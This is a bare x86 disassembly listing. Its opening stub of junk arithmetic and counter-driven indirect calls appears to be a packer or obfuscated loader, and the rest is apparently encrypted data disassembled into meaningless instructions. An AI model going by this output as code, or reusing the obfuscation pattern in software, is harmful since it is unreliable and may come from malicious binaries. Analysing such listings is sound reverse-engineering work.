  416abd:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  416ac4:	lea    eax,[ebp+0x14]
  416ac7:	mov    edx,DWORD PTR ds:0x42c00c
  416acd:	sub    DWORD PTR ds:0x42c01c,edx
  416ad3:	mov    DWORD PTR [ebp-0x4],eax
  416ad6:	and    DWORD PTR ds:0x42c01c,ebx
  416adc:	push   esi
  416add:	sub    ecx,esi
  416adf:	mov    esi,0xf89c85b6
  416ae4:	sub    ecx,ecx
  416ae6:	mov    DWORD PTR [ebp-0xc],esi
  416ae9:	or     DWORD PTR ds:0x42b000,0x59c6
  416af3:	lea    eax,[ebp-0xc]
  416af6:	sub    DWORD PTR ds:0x42b014,0x4110
  416b00:	mov    DWORD PTR [ebp-0x14],eax
  416b03:	add    ecx,ecx
  416b05:	mov    eax,DWORD PTR [ebp-0xc]
  416b08:	mov    edx,DWORD PTR [ebp-0x14]
  416b0b:	adc    DWORD PTR ds:0x429014,0x59c
  416b15:	mov    ecx,0x7510893
  416b1a:	xor    eax,ecx
  416b1c:	sub    DWORD PTR ds:0x42b014,0x42b004
  416b26:	add    eax,0x3272db
  416b2b:	mov    DWORD PTR [edx],eax
  416b2d:	mov    edx,DWORD PTR ds:0x42a004
  416b33:	add    DWORD PTR ds:0x429000,edx
  416b39:	mov    eax,ds:0x423e98
  416b3e:	mov    edx,DWORD PTR ds:0x42901c
  416b44:	add    DWORD PTR ds:0x429000,edx
  416b4a:	mov    edx,DWORD PTR [ebp-0x4]
  416b4d:	sub    DWORD PTR ds:0x42d000,0x780c
  416b57:	mov    eax,DWORD PTR [eax]
  416b59:	add    eax,DWORD PTR [edx]
  416b5b:	add    DWORD PTR ds:0x42900c,ecx
  416b61:	push   edi
  416b62:	and    DWORD PTR ds:0x429020,0x0
  416b6c:	mov    edx,DWORD PTR ds:0x429020
  416b72:	inc    edx
  416b73:	mov    DWORD PTR ds:0x429020,edx
  416b79:	cmp    DWORD PTR ds:0x429020,0x25
  416b80:	jne    0x416b8f
  416b86:	push   DWORD PTR [ebp-0x20]
  416b89:	call   DWORD PTR ds:0x425028
  416b8f:	cmp    DWORD PTR ds:0x429020,0x19
  416b96:	jb     0x416b6c
  416b9c:	add    DWORD PTR ds:0x42c01c,0x73bd
  416ba6:	mov    DWORD PTR [ebp-0x8],eax
  416ba9:	adc    DWORD PTR ds:0x42d00c,ecx
  416baf:	mov    edi,DWORD PTR [ebp+0x8]
  416bb2:	sbb    DWORD PTR ds:0x42d018,0x1580
  416bbc:	mov    eax,ds:0x424020
  416bc1:	and    DWORD PTR ds:0x42b01c,0x0
  416bcb:	jmp    0x416bdd
  416bd0:	mov    edx,DWORD PTR ds:0x42b01c
  416bd6:	inc    edx
  416bd7:	mov    DWORD PTR ds:0x42b01c,edx
  416bdd:	cmp    DWORD PTR ds:0x42b01c,0x1a
  416be4:	jae    0x416c47
  416bea:	cmp    DWORD PTR ds:0x42b01c,0x10
  416bf1:	jne    0x416c1c
  416bf7:	push   0x2d19
  416bfc:	push   DWORD PTR [ebp-0x10]
  416bff:	push   0x42d014
  416c04:	push   0x14d6
  416c09:	push   0x3bac
  416c0e:	push   0x6779
  416c13:	push   DWORD PTR [ebp-0xc]
  416c16:	call   DWORD PTR ds:0x42502c
  416c1c:	cmp    DWORD PTR ds:0x42b01c,0xf
  416c23:	jne    0x416c38
  416c29:	xor    edx,edx
  416c2b:	add    edx,DWORD PTR ds:0x42b01c
  416c31:	inc    edx
  416c32:	mov    DWORD PTR ds:0x42b01c,edx
  416c38:	jmp    0x416bd0
  416c3d:	adc    DWORD PTR ds:0x429028,0x58d4
  416c47:	mov    eax,DWORD PTR [eax+0x198]
  416c4d:	mov    edx,DWORD PTR ds:0x4243a3
  416c53:	mov    edx,DWORD PTR [edx]
  416c55:	add    DWORD PTR ds:0x42d008,edx
  416c5b:	xor    edi,ecx
  416c5d:	or     edx,0x793e
  416c63:	jmp    0x41901b
  416c68:	paddsw mm6,QWORD PTR es:[eax+0x63a36ce3]
  416c70:	mov    eax,0xece19036
  416c75:	pop    esi
  416c76:	xor    ebp,ecx
  416c78:	jp     0x416c9e
  416c7a:	popa   
  416c7b:	(bad)  
  416c7c:	(bad)  
  416c7d:	pop    edi
  416c7e:	bound  esp,QWORD PTR [edx-0x2a]
  416c81:	and    DWORD PTR [edx],ebx
  416c83:	sbb    dl,BYTE PTR [ebp-0x87f73c]
  416c89:	shr    bh,0xee
  416c8c:	nop
  416c8d:	loopne 0x416c21
  416c8f:	loop   0x416c62
  416c91:	es jg  0x416c91
  416c94:	sub    ebp,ebp
  416c96:	jno    0x416ca3
  416c98:	cwde   
  416c99:	mov    ch,0x8b
  416c9b:	popf   
  416c9c:	sub    eax,edx
  416c9e:	xor    eax,eax
  416ca0:	push   edi
  416ca1:	dec    ebp
  416ca2:	repnz mov al,ds:0x2b3d70c6
  416ca8:	cmp    ch,dl
  416caa:	jge    0x416c80
  416cac:	fprem1 
  416cae:	imul   eax
  416cb0:	fsub   DWORD PTR [esp+esi*4-0x3638f97f]
  416cb7:	stos   BYTE PTR es:[edi],al
  416cb8:	sbb    eax,ecx
  416cba:	push   esp
  416cbb:	and    BYTE PTR [eax],bh
  416cbd:	mov    esi,0x1072816a
  416cc2:	cmp    edi,DWORD PTR [esi+0x39]
  416cc5:	jge    0x416d2c
  416cc7:	adc    BYTE PTR [ebx],ch
  416cc9:	sub    DWORD PTR [edx-0x68],0x16dc5e35
  416cd0:	push   esi
  416cd1:	(bad)  
  416cd2:	pop    esi
  416cd3:	cli    
  416cd4:	retf   0x222c
  416cd7:	outs   dx,DWORD PTR ds:[esi]
  416cd8:	push   es
  416cd9:	jmp    0x416d32
  416cdb:	and    eax,0x70326865
  416ce0:	push   ebx
  416ce1:	pushf  
  416ce2:	add    BYTE PTR [edi+0x2d],bl
  416ce5:	fs jecxz 0x416cd7
  416ce8:	mul    DWORD PTR [esi]
  416cea:	loop   0x416c82
  416cec:	xchg   ecx,eax
  416ced:	and    ecx,DWORD PTR [eax-0x8]
  416cf0:	sub    bh,BYTE PTR [esi-0x61]
  416cf3:	pusha  
  416cf4:	outs   dx,BYTE PTR ds:[esi]
  416cf5:	inc    eax
  416cf6:	mov    ebx,0xbbceb28a
  416cfb:	hlt    
  416cfc:	js     0x416d32
  416cfe:	pop    esp
  416cff:	imul   ebp,ebx,0xffffffc4
  416d02:	pop    esp
  416d03:	jmp    0x416d28
  416d05:	(bad)
  416d08:	test   al,0xc8
  416d0a:	in     eax,dx
  416d0b:	pop    es
  416d0c:	pop    esi
  416d0d:	cmp    esi,DWORD PTR [esp+edi*8]
  416d10:	sub    BYTE PTR [ebp+esi*8+0x18],dh
  416d14:	ja     0x416d2c
  416d16:	fcomp  st(0)
  416d18:	test   eax,0x98465e1b
  416d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d1e:	ror    ecx,cl
  416d20:	fnstenv [edi]
  416d22:	dec    ecx
  416d23:	fld    TBYTE PTR [esi]
  416d25:	stos   BYTE PTR es:[edi],al
  416d26:	adc    DWORD PTR [ebp+0x1e],ecx
  416d29:	gs inc ebx
  416d2b:	mov    bh,0x17
  416d2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d2e:	push   esp
  416d2f:	scas   eax,DWORD PTR es:[edi]
  416d30:	in     eax,0xf4
  416d32:	xor    cl,ah
  416d34:	ret    0xfbd1
  416d37:	push   ecx
  416d38:	aaa    
  416d39:	repz mov ds:0xb62cb0de,eax
  416d3f:	pop    es
  416d40:	mov    ah,0x53
  416d42:	xor    esi,DWORD PTR ds:0x66764828
  416d48:	ja     0x416d8c
  416d4a:	and    bh,BYTE PTR [ebp-0x66122553]
  416d50:	pop    esi
  416d51:	stos   BYTE PTR es:[edi],al
  416d52:	enter  0x3f6,0xc3
  416d56:	adc    al,0x4d
  416d58:	loope  0x416d48
  416d5a:	mov    eax,0x728b82d7
  416d5f:	xlat   BYTE PTR ds:[ebx]
  416d60:	das    
  416d61:	xchg   BYTE PTR [ecx-0x41],dh
  416d64:	push   ss
  416d65:	stc    
  416d66:	icebp  
  416d67:	sub    BYTE PTR [eax+0x46],ch
  416d6a:	cld    
  416d6b:	mov    eax,ds:0xb1918549
  416d70:	pop    fs
  416d72:	(bad)
  416d76:	test   al,0x97
  416d78:	daa    
  416d79:	pop    ds
  416d7a:	test   dh,bl
  416d7c:	mov    esi,0xbb300743
  416d81:	and    BYTE PTR [ebp-0x5f],bl
  416d84:	lds    esi,FWORD PTR [edx+0x4b]
  416d87:	mov    ecx,0x263e6e82
  416d8c:	mov    ecx,0xd096f68b
  416d91:	clc    
  416d92:	addr16 jbe 0x416d3c
  416d95:	jg     0x416d62
  416d97:	lahf   
  416d98:	cmp    eax,0xe9b72ba1
  416d9d:	scas   eax,DWORD PTR es:[edi]
  416d9e:	jp     0x416ddd
  416da0:	jecxz  0x416dc6
  416da2:	dec    eax
  416da3:	sub    cl,BYTE PTR [esi+0x6d2a1d32]
  416da9:	add    BYTE PTR [ecx],ah
  416dab:	stos   DWORD PTR es:[edi],eax
  416dac:	jl     0x416e18
  416dae:	js     0x416e0b
  416db0:	add    al,0x9
  416db2:	pop    ds
  416db3:	cld    
  416db4:	cmp    DWORD PTR [ebp+eax*8-0x33],0x63
  416db9:	or     BYTE PTR [ebx-0x2c],dl
  416dbc:	ins    DWORD PTR es:[edi],dx
  416dbd:	inc    ebx
  416dbe:	add    BYTE PTR [esi+0xe2ae9a2],0xe1
  416dc5:	xor    al,0x48
  416dc7:	jno    0x416e0e
  416dc9:	xor    eax,0x5f03862f
  416dce:	sbb    eax,0xeaa07fa2
  416dd3:	call   0x2452ae23
  416dd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dd9:	mov    eax,ds:0x82f3cd8a
  416dde:	push   ds
  416ddf:	jns    0x416dab
  416de1:	(bad)  
  416de2:	lahf   
  416de3:	imul   ebp,DWORD PTR [edi-0x1bbc61b3],0x4bc40905
  416ded:	fst    st(1)
  416def:	jg     0x416e04
  416df1:	je     0x416e4c
  416df3:	in     al,0xab
  416df5:	outs   dx,BYTE PTR ds:[esi]
  416df6:	cmp    dh,BYTE PTR [ecx-0x47542f6d]
  416dfc:	dec    edi
  416dfd:	inc    edi
  416dfe:	data16 int 0xa6
  416e01:	(bad)  
  416e02:	and    al,0x2
  416e04:	inc    ebp
  416e05:	mov    ebp,0x45cf6ff1
  416e0a:	xor    al,0xef
  416e0c:	out    dx,eax
  416e0d:	and    DWORD PTR ds:0xd936cb42,ebp
  416e13:	xor    eax,0x879d48a0
  416e18:	dec    edx
  416e19:	inc    edx
  416e1a:	imul   edi,esp,0xffffffd7
  416e1d:	push   cs
  416e1e:	adc    edi,DWORD PTR [edi+0x28cdd6e7]
  416e24:	sbb    BYTE PTR [edi+0x6],dl
  416e27:	mov    dh,0xd8
  416e29:	push   edx
  416e2a:	icebp  
  416e2b:	inc    esi
  416e2c:	arpl   si,cx
  416e2e:	cmp    al,BYTE PTR [esi]
  416e30:	inc    ebx
  416e31:	pushf  
  416e32:	test   DWORD PTR [ecx],ebx
  416e34:	sbb    al,0x58
  416e36:	or     ebp,ebp
  416e38:	stc    
  416e39:	stos   BYTE PTR es:[edi],al
  416e3a:	pop    edx
  416e3b:	cmp    ebp,DWORD PTR [ebx]
  416e3d:	jns    0x416ded
  416e3f:	lods   al,BYTE PTR ds:[esi]
  416e40:	xor    dh,al
  416e42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e43:	sti    
  416e44:	dec    esi
  416e45:	scas   al,BYTE PTR es:[edi]
  416e46:	iret   
  416e47:	mov    al,0x8a
  416e49:	arpl   WORD PTR [ebx-0x66],bx
  416e4c:	dec    ebx
  416e4d:	push   esp
  416e4e:	adc    al,al
  416e50:	xchg   ebp,eax
  416e51:	fidiv  DWORD PTR [edi+0x7f]
  416e54:	and    eax,0x92dfbd81
  416e59:	imul   esi,DWORD PTR [ecx],0x1a07f070
  416e5f:	dec    ebx
  416e60:	push   eax
  416e61:	xor    BYTE PTR [ebx-0x3e723207],bl
  416e67:	adc    DWORD PTR [ebp+0x29],ebp
  416e6a:	nop
  416e6b:	jae    0x416e5d
  416e6d:	sbb    eax,DWORD PTR [ebp+0x6af0d4b5]
  416e73:	jns    0x416e33
  416e75:	push   es
  416e76:	inc    ecx
  416e77:	sub    eax,0x1b094bc
  416e7c:	sub    BYTE PTR [ecx+0x76109324],dh
  416e82:	cld    
  416e83:	adc    ah,ah
  416e85:	je     0x416e7e
  416e87:	push   ebx
  416e88:	gs data16 jb 0x416e60
  416e8c:	clc    
  416e8d:	das    
  416e8e:	ds push ebx
  416e90:	inc    edx
  416e91:	inc    edi
  416e92:	mov    ecx,0xda1d605f
  416e97:	jp     0x416ebb
  416e99:	mov    ds:0xd51fbaf5,eax
  416e9e:	stc    
  416e9f:	mov    ecx,DWORD PTR [edi+0x59]
  416ea2:	lods   al,BYTE PTR ds:[esi]
  416ea3:	cmp    esp,0x7848246f
  416ea9:	loop   0x416ebb
  416eab:	int    0x39
  416ead:	add    dl,BYTE PTR ds:0xda62318f
  416eb3:	scas   eax,DWORD PTR es:[edi]
  416eb4:	pmaxsw mm2,QWORD PTR ds:0xc3b35b9c
  416ebb:	ss cld 
  416ebd:	add    eax,0x2517626f
  416ec2:	dec    esi
  416ec3:	fsub   DWORD PTR [edx-0x54]
  416ec6:	out    0xd5,eax
  416ec8:	test   DWORD PTR [edi-0x73433291],edx
  416ece:	mov    edi,DWORD PTR [ebp+esi*4-0x7a]
  416ed2:	xchg   esp,eax
  416ed3:	xor    al,0x7d
  416ed5:	xor    eax,DWORD PTR [edi-0x45ceba2a]
  416edb:	dec    esi
  416edc:	(bad)  [edx+eiz*4]
  416edf:	sbb    eax,0x81e362b9
  416ee4:	mov    cl,0x48
  416ee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ee7:	popa   
  416ee8:	inc    eax
  416ee9:	lea    ebx,cs:[ecx+0x1c]
  416eed:	in     eax,0xc4
  416eef:	xchg   ebp,eax
  416ef0:	sti    
  416ef1:	mov    esi,0xf5b29a32
  416ef6:	popa   
  416ef7:	jmp    0x75c8:0x52f91aec
  416efe:	pop    ebp
  416eff:	xor    al,dh
  416f01:	js     0x416f3c
  416f03:	push   ecx
  416f04:	icebp  
  416f05:	mov    al,0x2
  416f07:	cli    
  416f08:	je     0x416f26
  416f0a:	repnz adc ebp,esi
  416f0d:	cmp    DWORD PTR [ebp+0x2db73060],0x3f
  416f14:	scas   eax,DWORD PTR es:[edi]
  416f15:	mov    al,0xd3
  416f17:	jp     0x416f58
  416f19:	sbb    DWORD PTR [ecx+0x23],eax
  416f1c:	out    dx,eax
  416f1d:	pop    esp
  416f1e:	mov    edx,0x94887814
  416f23:	dec    esp
  416f24:	ds jnp 0x416f31
  416f27:	mov    eax,ds:0xf0c302e2
  416f2c:	pop    edi
  416f2d:	inc    esi
  416f2e:	dec    esi
  416f2f:	inc    edx
  416f30:	xchg   DWORD PTR [ecx],edx
  416f32:	loope  0x416fa0
  416f34:	pop    ebp
  416f35:	jmp    0x416f29
  416f37:	rcl    DWORD PTR [edx],cl
  416f39:	mov    dh,dl
  416f3b:	js     0x416f8e
  416f3d:	mov    bh,0x27
  416f3f:	mov    esp,0x9f728a52
  416f44:	sbb    esp,DWORD PTR [eax]
  416f46:	adc    edx,ecx
  416f48:	inc    eax
  416f49:	inc    edi
  416f4a:	mov    esi,eax
  416f4c:	pushf  
  416f4d:	jbe    0x416f37
  416f4f:	rcr    DWORD PTR [ebp+ebx*1-0x1c],cl
  416f53:	repz ds arpl dx,dx
  416f57:	ror    bl,0x78
  416f5a:	repz mov dl,0xfd
  416f5d:	add    ah,BYTE PTR [ecx+0x1f]
  416f60:	int    0x63
  416f62:	enter  0x7c46,0xc5
  416f66:	pop    ds
  416f67:	retf   0x1c03
  416f6a:	out    dx,eax
  416f6b:	sbb    DWORD PTR [eax+0x48],0xffffffd2
  416f6f:	loop   0x416fd0
  416f71:	fdivr  DWORD PTR [esi]
  416f73:	aaa    
  416f74:	(bad)  
  416f75:	mov    ds:0x175e43e0,eax
  416f7a:	jg     0x416fa3
  416f7c:	push   esi
  416f7d:	fcom   QWORD PTR [esi]
  416f7f:	inc    esi
  416f80:	test   al,0x9
  416f82:	rcl    esi,cl
  416f84:	or     eax,0x950c092
  416f89:	dec    eax
  416f8a:	retf   
  416f8b:	push   ebp
  416f8c:	cmp    DWORD PTR [ebx-0x2e],ebp
  416f8f:	imul   eax,DWORD PTR [ebp-0x60b89248],0x46
  416f96:	lds    ebp,FWORD PTR ds:0x28dfc33d
  416f9c:	mov    ebp,0xb3489ab1
  416fa1:	jae    0x416fa0
  416fa3:	iret   
  416fa4:	mov    gs:0x46d79004,eax
  416faa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fab:	mov    eax,ds:0x3dcbc733
  416fb0:	(bad)  
  416fb1:	(bad)  
  416fb2:	cmp    eax,0x3a962c7e
  416fb7:	retf   
  416fb8:	ins    DWORD PTR es:[edi],dx
  416fb9:	lods   al,BYTE PTR ds:[esi]
  416fba:	rcr    DWORD PTR [ecx-0x25],0x19
  416fbe:	sbb    ebx,esi
  416fc0:	test   eax,0xd89ded52
  416fc5:	sbb    eax,0x3a2ef690
  416fca:	test   BYTE PTR [ecx-0x4d321bd9],dh
  416fd0:	add    bl,ch
  416fd2:	sub    dh,dl
  416fd4:	dec    edx
  416fd5:	retf   0x3c51
  416fd8:	push   edi
  416fd9:	hlt    
  416fda:	in     eax,dx
  416fdb:	repz (bad) 
  416fdd:	cld    
  416fde:	add    BYTE PTR [edx-0x2d],ah
  416fe1:	and    BYTE PTR ds:0x4cb6ccb7,al
  416fe7:	popa   
  416fe8:	dec    DWORD PTR [ebp-0x36]
  416feb:	push   0xa9644624
  416ff0:	icebp  
  416ff1:	mov    bl,0x3a
  416ff3:	add    DWORD PTR [ebx],edi
  416ff5:	mov    ds:0xc524d6e9,al
  416ffa:	ffreep st(0)
  416ffc:	mov    ch,0x53
  416ffe:	jnp    0x416fc3
  417000:	or     ch,ch
  417002:	stos   BYTE PTR es:[edi],al
  417003:	call   0x3b397511
  417008:	das    
  417009:	(bad)  
  41700a:	stc    
  41700b:	pop    esp
  41700c:	mov    ecx,0x93d3af65
  417011:	mov    ebx,0xc2b591a9
  417016:	mov    DWORD PTR [edx],eax
  417018:	push   edx
  417019:	dec    edx
  41701a:	mov    al,0x85
  41701c:	jmp    0x416feb
  41701e:	es mov dl,0xe9
  417021:	cmp    eax,0x1aecc362
  417026:	inc    eax
  417027:	jl     0x416fe7
  417029:	ret    0xebd
  41702c:	push   esi
  41702d:	push   ecx
  41702e:	pusha  
  41702f:	out    dx,eax
  417030:	add    bl,BYTE PTR [ebx-0x9]
  417033:	mov    ds:0xf03f795a,eax
  417038:	retf   0xdead
  41703b:	pop    ebp
  41703c:	ret    
  41703d:	xchg   ebx,eax
  41703e:	inc    esp
  41703f:	out    dx,al
  417040:	adc    BYTE PTR [ecx-0x35],dh
  417043:	sbb    BYTE PTR [edi],bl
  417045:	or     eax,0x8c72e546
  41704a:	mov    ebx,0xebd3d61
  41704f:	mov    cl,0xb3
  417051:	jno    0x417076
  417053:	jne    0x416fdf
  417055:	cmp    ch,BYTE PTR [eax-0x2eb92b9d]
  41705b:	push   edi
  41705c:	inc    ebp
  41705d:	fidiv  WORD PTR [bx-0x63ca]
  417062:	out    0xa3,al
  417064:	xchg   esp,eax
  417065:	aam    0x15
  417067:	ror    DWORD PTR [ebp+0x2411f368],0x9f
  41706e:	dec    ebx
  41706f:	sbb    eax,0x56578a2f
  417074:	mov    esp,0x70fd5c2
  417079:	pop    ds
  41707a:	fsubr  QWORD PTR [eax]
  41707c:	fstp   QWORD PTR [ebp-0x44]
  41707f:	popa   
  417080:	repz imul edx,ebp,0xffffff8f
  417084:	push   ebp
  417085:	jge    0x4170d8
  417087:	mov    cs,WORD PTR ds:[ebp+ecx*4+0x2f2e2867]
  41708f:	pop    ebp
  417090:	adc    al,ch
  417092:	sahf   
  417093:	adc    bl,al
  417095:	repnz pushf 
  417097:	mov    ds:0x37db8f23,al
  41709c:	outs   dx,BYTE PTR ds:[esi]
  41709d:	sub    DWORD PTR [ebx-0x3fc7e1c8],esp
  4170a3:	inc    esp
  4170a4:	and    DWORD PTR [ecx-0x32f3727],ecx
  4170aa:	and    ebx,DWORD PTR [ebx]
  4170ac:	out    0x22,eax
  4170ae:	and    BYTE PTR [ecx+0x2df65651],dl
  4170b4:	dec    esi
  4170b5:	pop    es
  4170b6:	stos   DWORD PTR es:[edi],eax
  4170b7:	add    al,0x19
  4170b9:	ret    0x29a1
  4170bc:	push   esi
  4170bd:	or     ebp,0x4ef52346
  4170c3:	jo     0x4170f0
  4170c5:	cdq    
  4170c6:	push   esp
  4170c7:	scas   al,BYTE PTR es:[edi]
  4170c8:	or     DWORD PTR [esi],ebp
  4170ca:	dec    esp
  4170cb:	xchg   edx,eax
  4170cc:	loopne 0x4170ca
  4170ce:	or     eax,0xde48f79c
  4170d3:	test   esi,ebx
  4170d5:	(bad)  
  4170d6:	hlt    
  4170d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170d8:	and    edx,esp
  4170da:	push   0x603ceb59
  4170df:	in     eax,dx
  4170e0:	dec    edi
  4170e1:	gs wrmsr 
  4170e4:	pop    eax
  4170e5:	fmul   DWORD PTR [ecx+0xf]
  4170e8:	sbb    al,0x8f
  4170ea:	lahf   
  4170eb:	inc    edx
  4170ec:	dec    ecx
  4170ed:	adc    DWORD PTR [ebp+0x1ee679ad],edx
  4170f3:	mov    esp,0x56c39609
  4170f8:	jmp    0xbb3e:0x938d0a0
  4170ff:	inc    esp
  417100:	cs pop eax
  417102:	pop    edi
  417103:	or     BYTE PTR [edi-0x61414a3c],ah
  417109:	and    ebx,eax
  41710b:	out    0x95,eax
  41710d:	add    ebp,DWORD PTR [ecx+0x3b]
  417110:	pop    esi
  417111:	fadd   QWORD PTR ds:0xb0feb165
  417117:	inc    eax
  417118:	inc    ecx
  417119:	nop
  41711a:	mov    edx,0x410e7081
  41711f:	bound  edx,QWORD PTR [ebp-0x43]
  417122:	xchg   ecx,eax
  417123:	imul   ebx,DWORD PTR [esi-0x3365d093],0x1f
  41712a:	or     DWORD PTR gs:[edx-0x7c],ebp
  41712e:	lahf   
  41712f:	enter  0xe854,0x4
  417133:	adc    al,0x24
  417135:	jmp    0xdf08c8d
  41713a:	bswap  ecx
  41713c:	push   edx
  41713d:	int    0x49
  41713f:	ficom  WORD PTR [ebx]
  417141:	push   0xffffffbd
  417143:	cwde   
  417144:	leave  
  417145:	add    dl,dl
  417147:	sbb    esp,esp
  417149:	sub    BYTE PTR [edx+0x30],dl
  41714c:	retf   
  41714d:	mov    al,ds:0xb7808177
  417152:	lods   eax,DWORD PTR ds:[esi]
  417153:	pop    ss
  417154:	imul   esp,edi,0x63891f33
  41715a:	push   ecx
  41715b:	mov    bl,0x95
  41715d:	repnz nop
  41715f:	sub    ebp,esp
  417161:	imul   esi,DWORD PTR [edx],0xffffff99
  417164:	cmp    ebx,DWORD PTR [ebp-0x25]
  417167:	pop    esi
  417168:	or     al,0xfe
  41716a:	cs test bl,ah
  41716d:	(bad)  
  41716e:	sub    dl,BYTE PTR [edi]
  417170:	shl    edi,0x89
  417173:	lods   eax,DWORD PTR ds:[esi]
  417174:	jmp    0x766f:0xef6d9e98
  41717b:	and    bl,BYTE PTR [ebp-0x26]
  41717e:	dec    DWORD PTR [eax+esi*2]
  417181:	les    ebx,FWORD PTR [eax-0x71]
  417184:	sbb    ah,BYTE PTR gs:[edx-0x480529f9]
  41718b:	add    DWORD PTR [ecx+eiz*2],edx
  41718e:	sub    al,0x7f
  417190:	stos   DWORD PTR es:[edi],eax
  417191:	popa   
  417192:	mov    bh,0xe2
  417194:	xchg   edi,eax
  417195:	jge    0x417169
  417197:	and    DWORD PTR [esi+0x103d6631],edi
  41719d:	int3   
  41719e:	inc    esp
  41719f:	and    ebx,DWORD PTR [ebp+ecx*8+0x67e83a9e]
  4171a6:	pop    ebp
  4171a7:	push   es
  4171a8:	retf   
  4171a9:	sub    al,0x5c
  4171ab:	pusha  
  4171ac:	(bad)  
  4171ad:	std    
  4171ae:	pop    ss
  4171af:	loopne 0x41721c
  4171b1:	pop    ss
  4171b2:	mov    edi,0xbac306d0
  4171b7:	xchg   ebp,eax
  4171b8:	out    dx,al
  4171b9:	ins    DWORD PTR es:[edi],dx
  4171ba:	xor    BYTE PTR [ebp+edx*1+0xf],0x90
  4171bf:	imul   ebx,DWORD PTR [edi-0x3294ebf0],0x1f6130d4
  4171c9:	jmp    0xc1dd:0xc1de7d24
  4171d0:	mov    cl,0xe1
  4171d2:	ror    cl,cl
  4171d4:	mov    dh,0x5f
  4171d6:	in     eax,dx
  4171d7:	sub    DWORD PTR [edx+0x42],edx
  4171da:	fidivr WORD PTR [edx+eiz*2-0x7c53ac6d]
  4171e1:	push   0x7d9cbb63
  4171e6:	das    
  4171e7:	or     edi,DWORD PTR [eax+0x37]
  4171ea:	dec    edi
  4171eb:	pop    ecx
  4171ec:	sbb    al,dh
  4171ee:	fucom  st(7)
  4171f0:	sbb    eax,0x48a94d62
  4171f5:	jno    0x4171d3
  4171f7:	dec    esi
  4171f8:	sub    DWORD PTR [ebx],edi
  4171fa:	dec    eax
  4171fb:	xchg   ebx,eax
  4171fc:	aad    0x54
  4171fe:	lahf   
  4171ff:	cdq    
  417200:	mov    al,ds:0xce98762d
  417205:	push   cs
  417206:	mov    eax,gs:0x3d78184e
  41720c:	sub    DWORD PTR ds:0xf35c5c25,esi
  417212:	mov    bh,0x49
  417214:	enter  0x8ef9,0xf4
  417218:	cmp    esi,eax
  41721a:	or     eax,0x697c953d
  41721f:	sahf   
  417220:	or     eax,DWORD PTR [ebx]
  417222:	jne    0x417241
  417224:	std    
  417225:	mov    edi,ds
  417227:	xlat   BYTE PTR ds:[ebx]
  417228:	cli    
  417229:	mov    edx,0xd50ec796
  41722e:	(bad)  
  41722f:	jge    0x417271
  417231:	jns    0x4171d4
  417233:	add    al,0x94
  417235:	push   ecx
  417236:	rcl    BYTE PTR [eax+0x42e065a1],0xf3
  41723d:	xchg   ebx,eax
  41723e:	rcr    BYTE PTR [ebp-0x228689a],cl
  417244:	daa    
  417245:	pop    es
  417246:	lds    edi,FWORD PTR [edi+0x4d]
  417249:	int3   
  41724a:	aaa    
  41724b:	fisub  DWORD PTR [esp+ecx*2]
  41724e:	(bad)  
  417250:	(bad)  
  417251:	adc    ah,bh
  417253:	dec    ecx
  417254:	pop    ebx
  417255:	fadd   st,st(2)
  417257:	jnp    0x41722f
  417259:	imul   ebp,DWORD PTR [edx+0x7d],0xe1881f3
  417260:	mov    ds:0x988afdec,eax
  417265:	imul   ecx,DWORD PTR [edx+0x27],0x73257982
  41726c:	imul   edx,DWORD PTR [ebx-0x456cf298],0x63
  417273:	outs   dx,DWORD PTR ds:[esi]
  417274:	call   DWORD PTR [ecx]
  417276:	stos   BYTE PTR es:[edi],al
  417277:	mov    edi,DWORD PTR [edi]
  417279:	in     al,0xcf
  41727b:	outs   dx,DWORD PTR ds:[esi]
  41727c:	mov    ch,dh
  41727e:	adc    al,0x51
  417280:	pop    edx
  417281:	loope  0x4172b2
  417283:	jg     0x4172d0
  417285:	sub    edi,DWORD PTR [eax]
  417287:	out    dx,al
  417288:	dec    ecx
  417289:	outs   dx,DWORD PTR ds:[esi]
  41728a:	pop    eax
  41728b:	push   ds
  41728c:	and    al,0x8c
  41728e:	(bad)  
  41728f:	loope  0x41723f
  417291:	nop
  417292:	fisubr DWORD PTR [edx+0xb]
  417295:	arpl   WORD PTR [edi+0x45b0f69f],cx
  41729b:	mov    al,0x4b
  41729d:	lods   al,BYTE PTR ds:[esi]
  41729e:	dec    esi
  41729f:	subps  xmm3,XMMWORD PTR [ebx+0x35]
  4172a3:	in     al,dx
  4172a4:	xchg   ebx,eax
  4172a5:	(bad)  
  4172a6:	adc    eax,0xa412e369
  4172ab:	int3   
  4172ac:	aam    0x2a
  4172ae:	pushf  
  4172af:	cmp    edi,DWORD PTR [eax]
  4172b1:	push   ecx
  4172b2:	sbb    BYTE PTR [esi-0x67],ch
  4172b5:	push   ebx
  4172b6:	bound  eax,QWORD PTR [ebp-0x27]
  4172b9:	jmp    0x457d:0x40a2ba47
  4172c0:	lock ins BYTE PTR es:[edi],dx
  4172c2:	inc    edx
  4172c3:	jmp    0xe306698c
  4172c8:	out    dx,eax
  4172c9:	sub    bl,BYTE PTR [edx]
  4172cb:	aas    
  4172cc:	seto   BYTE PTR [ecx-0x20]
  4172d0:	js     0x4172b4
  4172d2:	sahf   
  4172d3:	pop    ecx
  4172d4:	push   eax
  4172d5:	jg     0x417300
  4172d7:	sti    
  4172d8:	js     0x417294
  4172da:	add    al,0x37
  4172dc:	aad    0xc8
  4172de:	in     al,dx
  4172df:	push   eax
  4172e0:	inc    edx
  4172e1:	jo     0x4172da
  4172e3:	pop    ecx
  4172e4:	loope  0x417318
  4172e6:	mov    BYTE PTR [edx],cl
  4172e8:	adc    BYTE PTR [edx-0x40],dh
  4172eb:	jmp    0xf2c2a07a
  4172f0:	lea    ebp,[edx+0x760ce94f]
  4172f6:	mov    edx,DWORD PTR [edx+esi*1+0x3866dc60]
  4172fd:	shr    BYTE PTR [eax],1
  4172ff:	xor    ah,BYTE PTR [ebx-0x6f]
  417302:	xlat   BYTE PTR ds:[ebx]
  417303:	clc    
  417304:	or     eax,0x45c74e5b
  417309:	enter  0x4f8,0x95
  41730d:	sti    
  41730e:	inc    ecx
  41730f:	or     BYTE PTR [ebx],ah
